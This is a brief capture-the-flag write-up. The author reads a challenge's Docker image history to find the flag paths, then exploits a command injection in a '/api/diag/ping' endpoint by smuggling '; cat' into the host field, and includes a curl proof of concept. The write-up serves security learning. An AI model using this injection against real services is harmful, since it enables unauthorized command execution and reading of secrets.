# Vulnerability

1. Shell being enabled for user input that enables user to use RCE to attack service. 
2. Docker image of backend is accessible

# Extraction

Pulled the docker image and ran `sudo docker history --no-trunc hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend `

Using that command got the Image's layers.

One layer was this :
```
sha256:e8b21b83f74dd5ef63dd264f70cb6de5d095da53834cc2c01bde346cd90d89c9   5 days ago    CMD ["sh" "-c" "printf '%s\\n' \"$FLAG_F4\" > /app/flag.txt && printf '%s\\n' \"$FLAG_F9\" > /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt && python manage.py migrate --noinput && python manage.py collectstatic --noinput && python manage.py seed && gunicorn config.wsgi:application -b 0.0.0.0:8000"] 
```

This shows up the full path to flag 4 and flag 9 in container file system. I already have found flag 4 so for finding flag 9 I use command injection in `/api/diag/ping` api with this body:
```
{
  "host": "google.com; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"
}
```

and the response is :
```
{
  "output": FLAG9
}
```

# PoC

```
curl -s -X 'POST' \
  'https://ctf.seoeh.ir/api/diag/ping' \
  -H "Content-Type: application/json" \
  -d '{"host": "google.com; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}' | jq -r ".output"
```